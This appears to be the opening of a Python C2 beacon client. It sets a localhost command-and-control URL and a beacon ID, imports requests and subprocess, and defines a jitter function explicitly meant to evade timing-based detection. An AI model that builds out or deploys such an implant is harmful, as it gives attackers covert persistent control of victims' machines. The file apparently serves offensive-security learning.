# Stephen Graver - beacon.py
# Client side script

import os
import time
import random
import base64
import requests
import subprocess

# config
C2_URL = "http://127.0.0.1:5000"  # IP for c2
BEACON_ID = "GRV-01"
BASE_INTERVAL = 30  # sec
JITTER_PERCENT = 0.2  # 20% jitter


# Calculates a random sleep time to evade timing signatures.
def get_jitter_sleep():
    offset = BASE_INTERVAL * JITTER_PERCENT
    return BASE_INTERVAL + random.uniform(-offset, offset)